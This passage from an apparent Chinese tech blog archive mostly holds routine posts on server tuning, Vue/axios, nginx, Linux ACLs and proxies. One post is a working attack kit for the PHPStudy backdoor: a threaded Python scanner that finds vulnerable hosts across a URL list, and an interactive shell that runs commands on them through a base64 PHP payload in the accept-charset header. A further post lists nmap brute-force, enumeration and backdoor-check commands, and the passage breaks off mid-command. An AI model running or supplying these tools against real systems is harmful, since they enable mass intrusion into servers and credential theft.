65535-1024 个（0~1024 为受保护的)echo 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse 设置 time_wait 连接重用 默认 0echo 1 &gt; /proc/sys/net/ipv4/tcp_tw_recycle 设置快速回收 time_wait 连接 默认 0echo 180000 &gt; /proc/sys/net/ipv4/tcp_max_tw_buckets 设置最大 time_wait 连接长度 默认 262144echo 1 &gt; /proc/sys/net/ipv4/tcp_timestamps 设置是否启用比超时重发更精确的方法来启用对 RTT 的计算 默认 0echo 1 &gt; /proc/sys/net/ipv4/tcp_window_scaling 设置 TCP/IP 会话的滑动窗口大小是否可变 默认 1echo 20000 &gt; /proc/sys/net/ipv4/tcp_max_syn_backlog 设置最大处于等待客户端没有应答的连接数 默认 2048echo 15 &gt; /proc/sys/net/ipv4/tcp_fin_timeout 设置 FIN-WAIT 状态等待回收时间 默认 60echo "4096 87380 16777216" &gt; /proc/sys/net/ipv4/tcp_rmem 设置最大 TCP 数据发送缓冲大小，分别为最小、默认和最大值 默认 4096 87380 4194304echo "4096 65536 16777216" &gt; /proc/sys/net/ipv4/tcp_wmem 设置最大 TCP 数据 接受缓冲大小，分别为最小、默认和最大值 默认 4096 87380 4194304echo 10000 &gt; /proc/sys/net/core/somaxconn 设置每一个处于监听状态的端口的监听队列的长度 默认 128echo 10000 &gt; /proc/sys/net/core/netdev_max_backlog 设置最大等待 cpu 处理的包的数目 默认 1000echo 16777216 &gt; /proc/sys/net/core/rmem_max 设置最大的系统套接字数据接受缓冲大小 默认 124928echo 262144 &gt; /proc/sys/net/core/rmem_default 设置默认的系统套接字数据接受缓冲大小 默认 124928echo 16777216 &gt; /proc/sys/net/core/wmem_max 设置最大的系统套接字数据发送缓冲大小 默认 124928echo 262144 &gt; /proc/sys/net/core/wmem_default 设置默认的系统套接字数据发送缓冲大小 默认 124928echo 2000000 &gt; /proc/sys/fs/file-max 设置最大打开文件数 默认 385583 结合 ab 命令来压测机器优化网络，设置完记得保存 优化 Redis 命令设置内存分配方式： 1echo 1 &gt; /proc/sys/vm/overcommit_memory 0 表示内核将检查是否有足够的可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则，内存申请失败，并把错误返回给应用进程。 1 表示内核允许分配所有的物理内存，而不管当前的内存状态如何。 2 表示内核允许分配超过所有物理内存和交换空间总和的内存 关闭 THP： 1cho never &gt; /sys/kernel/mm/transparent_hugepage/enabled 尽管 THP 的本意是为提升性能，但某些数据库厂商还是建议直接关闭 THP(比如说 Oracle、MongoDB 等)，否则可能导致性能下降，内存锁，甚至系统重启等问题。 1echo 1024 &gt;/proc/sys/net/core/somaxconn 限制了接收新 TCP 连接侦听队列的大小。对于一个经常处理新连接的高负载 web 服务环境来说，默认的 128 太小了。大多数环境这个值建议增加到 1024 或者更多。 服务进程会自己限制侦听队列的大小 (例如 sendmail(8) 或者 Apache)，常常在它们的配置文件中有设置队列大小的选项。大的侦听队列对防止拒绝服务 DoS 攻击也会有所帮助。]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站访问日志的日常操作]]></title>
    <url>%2F2019%2F12%2F%E7%BD%91%E7%AB%99%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E7%9A%84%E6%97%A5%E5%B8%B8%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[前言日常工作中，网站如果遇到异常情况，经常需要查看访问日志来查找问题，由于日志文件庞大查找起来很不放便，所以需要进行一些过滤处理 筛选出可疑IP的访问日志1cat example.log | grep '127.0.0.1' &gt; 127.0.0.1.log 筛选出日志的某一列数据1awk -F "," '&#123;print $2" "$3"&#125;' example.log 根据某列数据进行去重1awk -F "," '!a[$2,$3]++' example.log 去除重复行1sort example.log | uniq]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue 中 axios 的封装]]></title>
    <url>%2F2019%2F11%2FVue%20%E4%B8%AD%20axios%20%E7%9A%84%E5%B0%81%E8%A3%85%2F</url>
    <content type="text"><![CDATA[前言虽然，axios 是个优秀的 HTTP 库，但是，直接在项目中使用并不是那么方便，所以，我们需要对其进行一定程度上的配置封装，减少重复代码，方便调用。 开始其实，网上关于 axios 封装的代码不少，但是大部分都是在入口文件（main.js）中进行 axios 全局对象属性定义的形式进行配置，类似于如下代码： 1axios.defaults.timeout = 10000 该方案有两个不足，首先，axios 封装代码耦合进入入口文件，不方便后期维护；其次，使用 axios 全局对象属性定义的方式进行配置，代码过于零散。 针对问题一，我使用了 Vue 源码结构中的一大核心思想——将功能拆分为文件，方便后期的维护。单独创建一个 http.js 或者 http.ts 文件，在文件中引入 axios 并对其进行封装配置，最后将其导出并挂载到 Vue 的原型上即可。此时，每次修改 axios 配置，只需要修改对应的文件即可，不会影响到不相关的功能。 针对问题二，采用 axios 官方推荐的，通过配置项创建 axios 实例的方式进行配置封装。 代码如下： 123456// http.jsimport axios from 'axios'// 创建 axios 实例const service = axios.create(&#123; // 配置项&#125;) 根据环境设置 baseURLbaseURL 属性是请求地址前缀，将自动加在 url 前面，除非 url 是个绝对地址。正常情况下，在开发环境下和生产模式下有着不同的 baseURL，所以，我们需要根据不同的环境切换不同的 baseURL。 在开发模式下，由于有着 devServer 的存在，需要根据固定的 url 前缀进行请求地址重写，所以，在开发环境下，将 baseURL 设为某个固定的值，比如：/apis。 在生产模式下，根据 Java 模块的请求前缀的不同，可以设置不同的 baseURL。 具体代码如下： 1234// 根据 process.env.NODE_ENV 区分状态，切换不同的 baseURLconst service = axios.create(&#123; baseURL: process.env.NODE_ENV === 'production' ? `/java` : '/apis',&#125;) 统一设置请求头在这里和大家聊一个问题，什么是封装？在我看来，封装是通过更少的调用代码覆盖更多的调用场景。 由于，大部分情况下，请求头都是固定的，只有少部分情况下，会需要一些特殊的请求头，所以，在这里，我采用的方案是，将普适性的请求头作为基础配置。当需要特殊请求头时，将特殊请求头作为参数传入，覆盖基础配置。 代码如下： 12345678910111213const service = axios.create(&#123; ... headers: &#123; get: &#123; 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8' // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来 &#125;, post: &#123; 'Content-Type': 'application/json;charset=utf-8' // 在开发中，一般还需要单点登录或者其他功能的通用请求头，可以一并配置进来 &#125; &#125;,&#125;) 跨域、超时、响应码处理axios 中，提供是否允许跨域的属性——withCredentials，以及配置超时时间的属性——timeout，通过这两个属性，可以轻松处理跨域和超时的问题。 下面，我们来说说响应码处理： axios 提供了 validateStatus 属性，用于定义对于给定的 HTTP 响应状态码是 resolve 或 reject promise。所以，正常设置的情况下，我们会将状态码为 2 系列或者 304 的请求设为 resolve 状态，其余为 reject 状态。结果就是，我们可以在业务代码里，使用 catch 统一捕获响应错误的请求，从而进行统一处理。 但是，由于我在代码里面使用了 async-await，而众所周知，async-await 捕获 catch 的方式极为麻烦，所以，在此处，我选择将所有响应都设为 resolve 状态，统一在 then 处理。 此部分代码如下： 12345678910const service = axios.create(&#123; // 跨域请求时是否需要使用凭证 withCredentials: true, // 请求 30s 超时 timeout: 30000, validateStatus: function () &#123; // 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常 return true &#125;,&#125;) 请求、响应处理在不使用 axios 的情况下，每次请求或者接受响应，都需要将请求或者响应序列化。 而在 axios 中， transformRequest 允许在向服务器发送请求前，修改请求数据；transformResponse 在传递给 then/catch 前，允许修改响应数据。 通过这两个钩子，可以省去大量重复的序列化代码。 代码如下： 1234567891011121314const service = axios.create(&#123; // 在向服务器发送请求前，序列化请求数据 transformRequest: [function (data) &#123; data = JSON.stringify(data) return data &#125;], // 在传递给 then/catch 前，修改响应数据 transformResponse: [function (data) &#123; if (typeof data === 'string' &amp;&amp; data.startsWith('&#123;')) &#123; data = JSON.parse(data) &#125; return data &#125;]&#125;) 拦截器拦截器，分为请求拦截器以及响应拦截器，分别在请求或响应被 then 或 catch 处理前拦截它们。 之前提到过，由于 async-await 中 catch 难以处理的问题，所以将出错的情况也作为 resolve 状态进行处理。但这带来了一个问题，请求或响应出错的情况下，结果没有数据协议中定义的 msg 字段（消息）。所以，我们需要在出错的时候，手动生成一个符合返回格式的返回数据。 由于，在业务中，没有需要在请求拦截器中做额外处理的需求，所以，请求拦截器的 resolve 状态，只需直接返回就可以了。 请求拦截器代码如下： 123456789// 请求拦截器service.interceptors.request.use((config) =&gt; &#123; return config&#125;, (error) =&gt; &#123; // 错误抛到业务代码 error.data = &#123;&#125; error.data.msg = '服务器异常，请联系管理员！' return Promise.resolve(error)&#125;) 再来聊聊响应拦截器，还是之前的那个问题，除了请求或响应错误，还有一种情况也会导致返回的消息体不符合协议规范，那就是状态码不为 2 系列或 304 时。此时，我们还是需要做一样的处理——手动生成一个符合返回格式的返回数据。但是，有一点不一样，我们还需要根据不同的状态码生成不同的提示信息，以方便处理上线后的问题。 响应拦截器代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// 根据不同的状态码，生成不同的提示信息const showStatus = (status) =&gt; &#123; let message = '' // 这一坨代码可以使用策略模式进行优化 switch (status) &#123; case 400: message = '请求错误(400)' break case 401: message = '未授权，请重新登录(401)' break case 403: message = '拒绝访问(403)' break case 404: message = '请求出错(404)' break case 408: message = '请求超时(408)' break case 500: message = '服务器错误(500)' break case 501: message = '服务未实现(501)' break case 502: message = '网络错误(502)' break case 503: message = '服务不可用(503)' break case 504: message = '网络超时(504)' break case 505: message = 'HTTP版本不受支持(505)' break default: message = `连接出错($&#123;status&#125;)!` &#125; return `$&#123;message&#125;，请检查网络或联系管理员！`&#125;// 响应拦截器service.interceptors.response.use((response) =&gt; &#123; const status = response.status let msg = '' if (status &lt; 200 || status &gt;= 300) &#123; // 处理http错误，抛到业务代码 msg = showStatus(status) if (typeof response.data === 'string') &#123; response.data = &#123; msg &#125; &#125; else &#123; response.data.msg = msg &#125; &#125; return response&#125;, (error) =&gt; &#123; // 错误抛到业务代码 error.data = &#123;&#125; error.data.msg = '请求超时或服务器异常，请检查网络或联系管理员！' return Promise.resolve(error)&#125;) tips1：友情提示，上面那一坨 switch-case 代码，可以使用策略模式进行优化~ tips2：如果有一些业务相关的需求，可以加在拦截器中，比如：loading、鉴权等~ 支持 TypeScript由于前段时间，我在部门内推了 TypeScript，为了满足自己的强迫症，将所有 js 文件改写为了 ts 文件。由于 axios 本身有 TypeScript 相关的支持，所以只需要把对应的类型导入，然后赋值即可。 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107// http.tsimport axios, &#123; AxiosRequestConfig, AxiosResponse &#125; from 'axios'const showStatus = (status: number) =&gt; &#123; let message = '' switch (status) &#123; case 400: message = '请求错误(400)' break case 401: message = '未授权，请重新登录(401)' break case 403: message = '拒绝访问(403)' break case 404: message = '请求出错(404)' break case 408: message = '请求超时(408)' break case 500: message = '服务器错误(500)' break case 501: message = '服务未实现(501)' break case 502: message = '网络错误(502)' break case 503: message = '服务不可用(503)' break case 504: message = '网络超时(504)' break case 505: message = 'HTTP版本不受支持(505)' break default: message = `连接出错($&#123;status&#125;)!` &#125; return `$&#123;message&#125;，请检查网络或联系管理员！`&#125;const service = axios.create(&#123; // 联调 baseURL: process.env.NODE_ENV === 'production' ? `/` : '/apis', headers: &#123; get: &#123; 'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8' &#125;, post: &#123; 'Content-Type': 'application/json;charset=utf-8' &#125; &#125;, // 是否跨站点访问控制请求 withCredentials: true, timeout: 30000, transformRequest: [(data) =&gt; &#123; data = JSON.stringify(data) return data &#125;], validateStatus () &#123; // 使用async-await，处理reject情况较为繁琐，所以全部返回resolve，在业务代码中处理异常 return true &#125;, transformResponse: [(data) =&gt; &#123; if (typeof data === 'string' &amp;&amp; data.startsWith('&#123;')) &#123; data = JSON.parse(data) &#125; return data &#125;]&#125;)// 请求拦截器service.interceptors.request.use((config: AxiosRequestConfig) =&gt; &#123; return config&#125;, (error) =&gt; &#123; // 错误抛到业务代码 error.data = &#123;&#125; error.data.msg = '服务器异常，请联系管理员！' return Promise.resolve(error)&#125;)// 响应拦截器service.interceptors.response.use((response: AxiosResponse) =&gt; &#123; const status = response.status let msg = '' if (status &lt; 200 || status &gt;= 300) &#123; // 处理http错误，抛到业务代码 msg = showStatus(status) if (typeof response.data === 'string') &#123; response.data = &#123;msg&#125; &#125; else &#123; response.data.msg = msg &#125; &#125; return response&#125;, (error) =&gt; &#123; // 错误抛到业务代码 error.data = &#123;&#125; error.data.msg = '请求超时或服务器异常，请检查网络或联系管理员！' return Promise.resolve(error)&#125;)export default service]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx 服务部署 Vue 项目后,出现 404 问题]]></title>
    <url>%2F2019%2F11%2F%E6%9C%8D%E5%8A%A1%E9%83%A8%E7%BD%B2Vue%E9%A1%B9%E7%9B%AE%E5%90%8E%E5%87%BA%E7%8E%B0%20404%20%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[前言在本地与部署线上环境后都没有问题，使用‘history’路由模式，部署线上环境后，首页能正常访问，点击其他页面，出现 404 Not Found 解决刷新页面时访问的资源在服务端找不到，因为此时vue-router设置路由地址被当作url地址，此时的地址路径不是真实存在的，所以出现404现象 在服务端nginx配置里添加vue-route的跳转设置（这里首页是index.html，如果是index.php就在下面对应位置替换），配置如下： 12345678910111213141516server&#123; listen 80; server_name www.test.com; index index.php index.html index.htm default.php default.htm default.html; root /www/wwwroot/test/dist; #vue-router配置 location / &#123; try_files $uri $uri/ @router; index index.html; &#125; location @router &#123; rewrite ^.*$ /index.html last; &#125;&#125; 重启 nginx 后，页面可以正常访问]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux文件访问控制列表]]></title>
    <url>%2F2019%2F10%2FLinux%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[前言如果希望对某个指定的用户进行单独的权限控制，就需要用到文件的访问控制列表（ACL）了。通俗来讲，基于普通文件或目录设置ACL其实就是针对指定的用户或用户组设置文件或目录的操作权限。另外，如果针对某个目录设置了ACL，则目录中的文件会继承其ACL；若针对文件设置了ACL，则文件不再继承其所在目录的ACL。 setfacl 命令setfacl命令用于管理文件的ACL规则，格式为“setfacl [参数] 文件名称”。 文件的ACL提供的是在所有者、所属组、其他人的读/写/执行权限之外的特殊权限控制，使用setfacl命令可以针对单一用户或用户组、单一文件或目录来进行读/写/执行权限的控制。 其中，针对目录文件需要使用-R递归参数；针对普通文件则使用-m参数；如果想要删除某个文件的ACL，则可以使用-b参数。 设置用户在/root目录上的权限： 12345678[root@linuxprobe ~]# setfacl -Rm u:linuxprobe:rwx /root[root@linuxprobe ~]# su - linuxprobeLast login: Sat Mar 21 15:45:03 CST 2017 on pts/1[linuxprobe@linuxprobe ~]$ cd /root[linuxprobe@linuxprobe root]$ lsanaconda-ks.cfg Downloads Pictures Public[linuxprobe@linuxprobe root]$ cat anaconda-ks.cfg[linuxprobe@linuxprobe root]$ exit 常用的ls命令是看不到ACL表信息的，但是却可以看到文件的权限最后一个点（.）变成了加号（+）,这就意味着该文件已经设置了ACL了。 12[root@linuxprobe ~]# ls -ld /rootdr-xrwx---+ 14 root root 4096 May 4 2017 /root getfacl 命令getfacl命令用于显示文件上设置的ACL信息，格式为“getfacl 文件名称”。 想要设置ACL，用的是setfacl命令；要想查看ACL，则用的是getfacl命令。 使用getfacl命令显示在root管理员家目录上设置的所有ACL信息。 12345678910[root@linuxprobe ~]# getfacl /rootgetfacl: Removing leading '/' from absolute path names# file: root# owner: root# group: rootuser::r-xuser:linuxprobe:rwxgroup::r-xmask::rwxother::---]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux文件的隐藏属性]]></title>
    <url>%2F2019%2F10%2FLinux%E6%96%87%E4%BB%B6%E7%9A%84%E9%9A%90%E8%97%8F%E5%B1%9E%E6%80%A7%2F</url>
    <content type="text"><![CDATA[前言Linux系统中的文件除了具备一般权限和特殊权限之外，还有一种隐藏权限，即被隐藏起来的权限，默认情况下不能直接被用户发觉。明明权限充足但却无法删除某个文件的情况，或者仅能在日志文件中追加内容而不能修改或删除内容，这在一定程度上阻止了黑客篡改系统日志的图谋，因此这种“奇怪”的文件也保障了Linux系统的安全性。 chattr 命令chattr命令用于设置文件的隐藏权限，格式为“chattr [参数] 文件”。如果想要把某个隐藏功能添加到文件上，则需要在命令后面追加“+参数”，如果想要把某个隐藏功能移出文件，则需要追加“-参数” 共有以下8种模式： a：让文件或目录仅供附加用途； b：不更新文件或目录的最后存取时间； c：将文件或目录压缩后存放； d：将文件或目录排除在倾倒操作之外； i：不得任意更动文件或目录； s：保密性删除文件或目录； S：即时更新文件或目录； u：预防意外删除。 选项： -R：递归处理，将指令目录下的所有文件及子目录一并处理； -v&lt;版本编号&gt;：设置文件或目录版本； -V：显示指令执行过程； +&lt;属性&gt;：开启文件或目录的该项属性； -&lt;属性&gt;：关闭文件或目录的该项属性； =&lt;属性&gt;：指定文件或目录的该项属性。 新建一个普通文件，并为其设置不允许删除与覆盖（+a参数）权限，然后再尝试将这个文件删除： 12345[root@linuxprobe ~]# echo "for Test" &gt; linuxprobe[root@linuxprobe ~]# chattr +a linuxprobe[root@linuxprobe ~]# rm linuxproberm: remove regular file ‘linuxprobe’? yrm: cannot remove ‘linuxprobe’: Operation not permitted lsattr 命令lsattr命令用于显示文件的隐藏权限，格式为“lsattr [参数] 文件”。 -E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。 -D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。 -R：递归的操作方式； -V：显示指令的版本信息； -a：列出目录中的所有文件，包括隐藏文件。 lsattr经常使用的几个选项-D，-E，-R这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用lsattr时，必须指出具体的设备名，用-l选项指出要显示设备的逻辑名称，否则要用-c，-s，-t等选项唯一的确定某个已存在的设备。 在Linux系统中，文件的隐藏权限必须使用lsattr命令来查看，平时使用的ls之类的命令则看不出端倪 一旦使用lsattr命令后，文件上被赋予的隐藏权限马上就会原形毕露。此时可以按照显示的隐藏权限的类型（字母），使用chattr命令将其去掉： 1234567[root@linuxprobe ~]# lsattr linuxprobe-----a---------- linuxprobe[root@linuxprobe ~]# chattr -a linuxprobe[root@linuxprobe ~]# lsattr linuxprobe ---------------- linuxprobe[root@linuxprobe ~]# rm linuxprobe rm: remove regular file ‘linuxprobe’? y]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac设置虚拟机使用宿主机代理]]></title>
    <url>%2F2019%2F9%2FMac%E8%AE%BE%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BD%BF%E7%94%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[前言前提：mac 本身已经安装 ss，并且可以通过 ss 科学上网（或者 win 也一样）想要实现：Parallels Desktop 里的虚拟机也想科学上网（或者 win 里安装 vmware 也一样，或者是另一台物理机也是一样的） 方法一：虚拟机也安装一个 ss 客户端对于有窗口的系统，比如你虚拟机里安装的是 win、或者 ubuntu 等，那么再安装一个客户端是很方便的，这就相当于在另一台电脑里使用 ss 客户端，既然 mac 上你会用了，那在其他电脑上也是一样的。 但是如果虚拟机里是最小化安装的纯命令行的 centos，那么使用客户端可能有一定的麻烦，yum 无法安装，pip 安装的感觉也是 ssserver，并没有客户端，所以客户端还得编译，编译还有很多依赖，编译好还得写对配置文件，很多人都不太清楚这个，所以还是挺麻烦的。 方法二：虚拟机设置代理到宿主机即虚拟机里设置代理到 mac（这里 mac 就是虚拟机的宿主机），让虚拟机通过 mac 的 ss 科学上网，这里如果宿主机换成 win，虚拟机软件换成 vmware 或 virtualbox，它的原理也都是一样的。 设置方法： 1、首先把宿主机的 ss 设置里的 Local Socks5 Listen Address 由原来的127.0.0.1设置为0.0.0.0，如果需要通过 HTTP 代理，那么也要把 ss 里的 HTTP 选项打开，并把 HTTP proxy Listen Address 地址由原来的127.0.0.1设置为0.0.0.0，这样做表示代理所有 ip，而不只是本机的127.0.0.1。如果用的是其他科学上网工具，也有些写成 “share over LAN(通过局域网共享)”，如果有这个选项，选上了就表示监听0.0.0.0。 2、搞清楚虚拟机是通过什么方式联网的，虚拟机连网无非有两种方式： 桥接 NAT 如果是桥接连网，那么只要找出宿主机的联网 ip 即可（mac 的话，一般都是 wifi，或者通过转接头插网线的话，那就是转接头对应的 ip） 如果是 NAT 连网的，那么要找出宿主机中 NAT 网卡的 ip（在 mac 里使用 parallels desktop 虚拟机的话，NAT 网卡一般是 parallels Shared 开头的） 3、在虚拟机里的~/.bashrc或~/.zshrc里，添加以下两句的其中一句： 一般填入局域网IP即可 12export ALL_PROXY=SOCKS5://IP:端口export ALL_PROXY=HTTP://IP:端口 第一句表示使用 SOCKS5 代理，第二句表示使用 HTTP 代理，ip 就是第 2 步中找到的 ip，端口就是 ss 对应的端口，打开 ss 的设置里就有，一般 ss 有两个端口，一个 socks5 端口，一个 http 端口，找到对应端口填进去即可。 最后 source 一下配置文件：1source ~/.bashrc 或者用 zsh shell 的话就是：1source ~/.zshrc 测试 ip 是哪里的： 1curl https://ip.cn 如果显示的是代理服务器所在地址 (比如美国) 和 ip，那说明代理设置成功。 然后试试能否访问 google：1curl https://www.google.com 如果是 Windows，可以直接在 cmd 里设用set http_proxy=http://127.0.0.1:1087，set https_proxy=http://127.0.0.1:1087，set all_proxy=http://127.0.0.1:1087 更好的写法 1234# 设置使用代理alias setproxy="export https_proxy=http://127.0.0.1:1087; export http_proxy=http://127.0.0.1:1087; export all_proxy=socks5://127.0.0.1:1086; echo 'Set proxy successfully'"# 设置取消使用代理alias unsetproxy="unset http_proxy; unset https_proxy; unset all_proxy; echo 'Unset proxy successfully'"]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPStudy后门rec批量利用脚本]]></title>
    <url>%2F2019%2F9%2FPHPStudy%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[前言北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。 批量检测1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import base64import requestsimport threadingimport threadpoolfrom requests.packages.urllib3.exceptions import InsecureRequestWarningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)files=input('files:\n')def write_shell(url): payload = "echo md5(123);" payload = base64.b64encode(payload.encode('utf-8')) headers = &#123; 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'accept-charset': payload, 'Accept-Encoding': 'gzip,deflate', 'Connection': 'close',&#125; try: r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=10) if "202cb962ac59075b964b07152d234b70" in r.text: print ('[ + ] BackDoor successful: '+url+'===============[ + ]\n') with open(files+'.success.txt','a') as f: f.write(url+'\n') else: print ('[ - ] BackDoor failed: '+url+'[ - ]\n') except: print ('[ - ] Timeout: '+url+' [ - ]\n')def main(): with open(files,'r') as f: lines = f.read().splitlines() task_pool=threadpool.ThreadPool(10) requests=threadpool.makeRequests(write_shell,lines) for req in requests: task_pool.putRequest(req) task_pool.wait()if __name__ == '__main__': main() 交互Shell12345678910111213141516171819202122232425262728293031323334353637383940414243import base64import requestsimport threadingimport threadpoolimport reprint("======Phpstudy Backdoor Exploit---os-shell============\n")print("===========By Qing=================\n")print("=====Blog：https://www.cnblogs.com/-qing-/==\n")def os_shell(url,headers,payload): try: r = requests.get(url=url+'/phpinfo.php',headers=headers,verify=False,timeout=10) # print(r.text) res = re.findall("qing(.*?)qing",r.text,re.S) print("[ + ]===========The Response:==========[ + ]\n") res = "".join(res) print(res) except: print("[ - ]===========Failed! Timeout...==========[ - ]\n")def main(): url = input("input the Url , example:\"http://127.0.0.1/\"\n") payload = input("input the payload , default:echo system(\"whoami\");\n") de_payload = "echo \"qing\";system(\"whoami\");echo \"qing\";" if payload.strip() == '': payload = de_payload payload = "echo \"qing\";"+payload+"echo \"qing\";" payload = base64.b64encode(payload.encode('utf-8')) payload = str(payload, 'utf-8') headers = &#123; 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9', 'accept-charset': payload, 'Accept-Encoding': 'gzip,deflate', 'Connection': 'close', &#125; os_shell(url=url,headers=headers,payload=payload)if __name__ == '__main__': main()]]></content>
      <categories>
        <category>hacker</category>
      </categories>
      <tags>
        <tag>PHPStudy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmap脚本检测]]></title>
    <url>%2F2019%2F9%2Fnmap%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[前言在实战中相对比较实用的nmap脚本 1# nmap -sV -sT -Pn –open -v 192.168.3.23 也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的: 1# nmap -sT -Pn –open -v banner.nse 192.168.3.23 和ftp相关的一些漏洞检测脚本:ftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡 1# nmap -p 21 –script ftp-anon.nse -v 192.168.3.23 ftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破] 1# nmap -p 21 –script ftp-brute.nse -v 192.168.3.23 ftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出 1# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23 ftp-proftpd-backdoor.nse ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令 1# nmap -p 21 –script ftp-vuln-cve2010-4221.nse -v 192.168.3.23 ftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门 1# nmap -p 21 –script ftp-vsftpd-backdoor.nse -v 192.168.3.23 和ssh 相关的一些扫描脚本:sshv1.nse sshv1是可以中间人的 1# nmap -p 22 –script sshv1.nse -v 192.168.3.23 和smtp 相关的一些扫描脚本:smtp-brute.nse 简单爆破smtp 1# nmap -p 25 –script smtp-brute.nse -v 192.168.3.23 smtp-enum–users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行 1# nmap -p 25 –script smtp-enum-users.nse -v 192.168.3.23 smtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出 1# nmap -p 25 –script smtp-vuln-cve2010-4344.nse -v 192.168.3.23 smtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出 1# nmap -p 25 –script smtp-vuln-cve2011-1720.nse -v 192.168.3.23 smtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了 1# nmap -p 25 –script smtp-vuln-cve2011-1764.nse -v 192.168.3.23 和pop3 相关的一些扫描脚本:pop3-brute.nse pop简单弱口令爆破 1# nmap -p 110 –script pop3-brute.nse -v 192.168.3.23 和imap 相关的一些扫描脚本:imap-brute.nse imap简单弱口令爆破 1# nmap -p 143,993 –script imap-brute.nse -v 192.168.3.23 和dns 相关的一些漏洞扫描脚本:dns-zone-transfer.nse 检查目标ns服务器是否允许传送 1# nmap -p 53 –script dns-zone-transfer.nse -v 192.168.3.23 1# nmap -p 53 –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain=target.org -v 192.168.3.23 hostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉 1# nmap -p80 –script hostmap-ip2hosts.nse 192.168.3.23 和各种数据库相关的扫描脚本:informix-brute.nse informix爆破脚本 1# nmap -p 9088 –script 